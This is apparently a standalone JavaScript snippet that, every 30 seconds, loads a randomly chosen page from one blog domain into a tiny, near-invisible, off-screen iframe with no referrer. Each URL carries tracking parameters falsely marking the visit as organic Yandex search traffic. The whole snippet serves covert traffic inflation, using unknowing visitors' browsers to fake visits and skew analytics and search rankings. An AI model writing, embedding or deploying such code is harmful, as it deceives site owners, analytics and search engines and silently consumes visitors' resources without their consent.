  const urls = [
    "https://www.supremenet.online/2024/11/blog-post.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/10-2024.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/seo.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_3.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_30.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_20.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_33.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_18.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_37.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.supremenet.online/2024/11/blog-post_36.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
  ];

  function loadIframe() {
    const page = urls[Math.floor(Math.random() * urls.length)];
    const iframe = document.createElement("iframe");
    iframe.src = page;
    iframe.style = "width:1px; height:1px; opacity:0.01; position:absolute; left:-9999px;";
    iframe.referrerPolicy = "no-referrer";
    document.body.appendChild(iframe);
  }

  loadIframe();
  setInterval(loadIframe, 30000);
